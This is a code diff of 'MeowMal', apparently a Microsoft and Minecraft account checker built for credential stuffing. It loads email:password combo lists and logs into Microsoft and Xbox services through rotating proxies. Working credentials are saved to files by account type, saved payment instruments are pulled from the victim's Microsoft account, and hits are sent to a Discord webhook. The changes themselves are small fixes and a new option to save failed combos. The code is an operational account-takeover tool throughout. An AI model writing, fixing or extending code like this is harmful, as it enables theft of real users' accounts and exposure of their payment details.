     def handle(self, session):
         global hits, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
         if self.name and self.name != 'N/A':
@@ -1769,39 +1666,28 @@ class Capture:
                 ui.log_error(f"Builder error: {e}")
             fullcapt = f"{self.email}:{self.password}"
             masked_capt = f"{self.email}:***"
-        
         try:
             with open(f'results/{fname}/Hits.txt', 'a') as file:
                 rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
                 file.write(f'{self.email}:{self.password}{rank_str}\n')
                 with stats_lock:
                     hits += 1
-                    
-                    
-                    
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f"Failed to write Hit: {e}")
-            
-            
-            
             with stats_lock:
                  hits += 1
-
         try:
             open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
         except:
             pass
-            
         try:
             stats_text = fetch_meowapi_stats(self.name, self.uuid)
-
         except Exception:
             stats_text = None
         if UI_ENABLED and ui:
             ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
         self.send_discord_webhook()
-
     def send_discord_webhook(self):
         try:
             enable_notifications = config.get('enable_notifications')
@@ -1905,7 +1791,6 @@ class Capture:
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f'[Webhook] Error: {type(e).__name__}: {str(e)[:100]}')
-
 def get_urlPost_sFTTag(session):
     global retries
     attempts = 0
@@ -1929,7 +1814,6 @@ def get_urlPost_sFTTag(session):
         attempts += 1
         time.sleep(0.1)
     return (None, None, session)
-
 def get_xbox_rps(session, email, password, urlPost, sFTTag):
     global bad, checked, cpm, twofa, retries, checked
     tries = 0
@@ -1971,7 +1855,6 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
             tries += 1
             time.sleep(0.1)
     return ('None', session)
-
 def payment(session, email, password):
     global retries, payment_methods, hits, config
     attempts = 0
@@ -1983,7 +1866,6 @@ def payment(session, email, password):
             token = parse_qs(urlparse(r.url).fragment).get('access_token', ['None'])[0]
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36', 'Pragma': 'no-cache', 'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Authorization': f'MSADELEGATE1.0={token}', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Host': 'paymentinstruments.mp.microsoft.com', 'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2', 'Origin': 'https://account.microsoft.com', 'Referer': 'https://account.microsoft.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'Sec-GPC': '1'}
             r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=int(config.get('timeout', 10)))
-
             def lr_parse(source, start_delim, end_delim, create_empty=True):
                 pattern = re.escape(start_delim) + '(.*?)' + re.escape(end_delim)
                 match = re.search(pattern, source)
@@ -2141,7 +2023,6 @@ def payment(session, email, password):
             retries += 1
             session.proxies = getproxy()
             time.sleep(2)
-
 def validmail(email, password):
     global vm, cpm, checked
     vm += 1
@@ -2160,7 +2041,6 @@ def validmail(email, password):
         pass
     if UI_ENABLED and ui:
         ui.add_log(f'Valid Mail: {email}{meowapi_stats}', 'SUCCESS')
-
 def capture_mc(access_token, session, email, password, type):
     global retries
     attempts = 0
@@ -2204,7 +2084,6 @@ def capture_mc(access_token, session, email, password, type):
                 except Exception:
                     pass
             continue
-
 def checkownership(entitlements_response):
     items = entitlements_response.get('items', [])
     has_normal_minecraft = False
@@ -2229,7 +2108,6 @@ def checkownership(entitlements_response):
         return 'Xbox Game Pass Ultimate'
     elif has_game_pass_pc:
         return 'Xbox Game Pass (PC)'
-
 def checkmc(session, email, password, token, xbox_token):
     global retries, bedrock, cpm, checked, xgp, xgpu, other, config
     acctype = None
@@ -2264,7 +2142,8 @@ def checkmc(session, email, password, token, xbox_token):
         if acctype is None:
             return False
         if acctype == 'Xbox Game Pass Ultimate' or acctype == 'Normal Minecraft (with Game Pass Ultimate)':
-            xgpu += 1
+            with stats_lock:
+                xgpu += 1
             codes = []
             with open(f'results/{fname}/XboxGamePassUltimate.txt', 'a') as f:
                 f.write(f'{email}:{password}\n')
@@ -2365,7 +2244,8 @@ def checkmc(session, email, password, token, xbox_token):
             capture_mc(token, session, email, password, acctype)
             return True
         elif acctype == 'Xbox Game Pass (PC)' or acctype == 'Normal Minecraft (with Game Pass)':
-            xgp += 1
+            with stats_lock:
+                xgp += 1
             codes = []
             with open(f'results/{fname}/XboxGamePass.txt', 'a') as f:
                 f.write(f'{email}:{password}\n')
@@ -2479,7 +2359,8 @@ def checkmc(session, email, password, token, xbox_token):
             if 'product_dungeons' in checkrq.text:
                 others.append('Minecraft Dungeons')
             if others != []:
-                other += 1
+                with stats_lock:
+                    other += 1
                 items = ', '.join(others)
                 open(f'results/{fname}/Other.txt', 'a').write(f'{email}:{password} | {items}\n')
                 meowapi_stats = ''
@@ -2499,7 +2380,6 @@ def checkmc(session, email, password, token, xbox_token):
                 return False
     else:
         return False
-
 def mc_token(session, uhs, xsts_token):
     global retries
     attempts = 0
@@ -2519,7 +2399,6 @@ def mc_token(session, uhs, xsts_token):
             time.sleep(0.1)
             continue
     return None
-
 def create_optimized_session():
     session = requests.Session()
     session.verify = False
@@ -2532,7 +2411,6 @@ def create_optimized_session():
     session.mount('https://', adapter)
     session.mount('http://', adapter)
     return session
-
 def authenticate(email, password, tries=0, use_optimized=False):
     global retries, bad, checked, cpm, twofa
     counters_incremented = False
@@ -2607,12 +2485,10 @@ def authenticate(email, password, tries=0, use_optimized=False):
             retries += 1
             if UI_ENABLED and ui and (tries == 1):
                 ui.log_error(f'[{email}] Auth exception: {type(e).__name__}, retrying...')
-            authenticate(email, password, tries)
+            return authenticate(email, password, tries)
         else:
             if not counters_incremented:
-                bad += 1
-                checked += 1
-                cpm += 1
+                pass
             if UI_ENABLED and ui:
                 ui.log_error(f'[{email}] Failed after {maxretries} retries: {type(e).__name__}')
                 ui.log_bad(email)
@@ -2621,7 +2497,6 @@ def authenticate(email, password, tries=0, use_optimized=False):
             session.close()
         except:
             pass
-
 def fetch_proxies_from_api(proxy_type='http'):
     global proxylist, last_proxy_fetch, proxy_api_url, proxy_request_num, proxy_time, api_socks4, api_socks5, api_http
     try:
@@ -2683,7 +2558,6 @@ def fetch_proxies_from_api(proxy_type='http'):
     except Exception as e:
         print(f'{Fore.RED}[ERROR] Failed to fetch proxies from API: {str(e)}{Fore.RESET}')
         return False
-
 def getproxy():
     global auto_proxy, last_proxy_fetch, proxy_time, proxylist, proxytype
     proxy_protocol = 'http'
@@ -2733,7 +2607,6 @@ def getproxy():
                 ui.log_error(f'Proxy format error: {str(e)}')
             return {}
     return {}
-
 def Checker(combo):
     global bad, checked, cpm, hits, errors
     start_time = time.time()
@@ -2789,6 +2662,9 @@ def Checker(combo):
                 bad += 1
             if UI_ENABLED and ui:
                 ui.log_bad(email)
+            if config.get('save_bad', False):
+                with open(f'results/{fname}/Bads.txt', 'a') as f:
+                    f.write(f'{email}:{password}\n')
     except Exception as e:
         with stats_lock:
             bad += 1
@@ -2798,7 +2674,6 @@ def Checker(combo):
         if UI_ENABLED and ui:
             ui.log_bad(combo.split(':')[0] if ':' in combo else combo.strip())
             ui.log_error(f'Error: {str(e)[:50]}')
-
 def logscreen():
     global cpm, cpm1, screen, hits, bad, twofa, mfa, sfa, xgp, xgpu, vm, other, checked, retries, errors
     total_combos = len(Combos)
@@ -2816,7 +2691,6 @@ def logscreen():
             ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm1 * 60, retries=retries, errors=errors)
             ui.show_ui_screen()
         time.sleep(1)
-
 def load_proxies():
     global proxylist, banproxies
     proxy_pattern = re.compile('^\\d+\\.\\d+\\.\\d+\\.\\d+:\\d+')
@@ -2867,7 +2741,6 @@ def load_proxies():
             print(f'{Fore.YELLOW}Warning: Could not load banproxies.txt - {e}{Fore.RESET}')
     else:
         print(f'{Fore.YELLOW}No banproxies.txt found. Ban checking may not work properly.{Fore.RESET}')
-
 def load_proxy_file():
     global proxylist
     filename = None
@@ -2894,7 +2767,6 @@ def load_proxy_file():
     except Exception as e:
         print(f'✗ Error reading proxy file: {str(e)}')
         time.sleep(0.5)
-
 def Load():
     global Combos, fname
     filename = 'acc.txt'
@@ -2940,10 +2812,8 @@ def Load():
         print(f'✗ Your file is probably corrupted or in wrong format.')
         time.sleep(2)
         Load()
-
 def loadconfig():
     global maxretries, config
-
     def str_to_bool(value):
         if isinstance(value, bool):
             return value
@@ -3005,7 +2875,6 @@ def loadconfig():
     config.set('dns_cache_enabled', config_loader.get('dns_cache_enabled', True))
     config.set('keep_alive_enabled', config_loader.get('keep_alive_enabled', True))
     return True
-
 def Main():
     global fname, screen, config, proxytype, banproxies, errors, cpm1, hits, bad, twofa, vm, xgp, xgpu, other, mfa, sfa, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, checked, retries
     utils.set_title("MeowMal by MeowMal Dev's")
@@ -3165,7 +3034,6 @@ def Main():
         input('Press Enter to exit...')
     finally:
         print(f'\n{Fore.CYAN}Thank you for using MeowMal! 🐱{Fore.RESET}\n')
-
 def detect_proxy_protocol(proxies_list):
     if not proxies_list:
         return '4'
@@ -3186,7 +3054,6 @@ def detect_proxy_protocol(proxies_list):
                 continue
     print(f'{Fore.BLUE}ℹ Defaulting to HTTP proxy type.{Fore.RESET}')
     return '1'
-
 def Proxys():
     global proxylist, proxytype, auto_proxy, proxy_api_url, proxy_request_num, proxy_time
     print(f"\n{Fore.BLUE}{'=' * 60}")
@@ -3214,7 +3081,6 @@ def Proxys():
         print(f'{Fore.LIGHTRED_EX}Error reading proxy file: {str(e)}{Fore.RESET}')
         proxytype = "'4'"
         time.sleep(2)
-
 def banproxyload():
     global banproxies
     print(f"\n{Fore.CYAN}{'=' * 60}")
@@ -3243,7 +3109,6 @@ def banproxyload():
     except Exception as e:
         print(f'{Fore.LIGHTRED_EX}Error reading ban proxy file: {str(e)}{Fore.RESET}')
         time.sleep(2)
-
 def main():
     Main()
 if __name__ == '__main__':
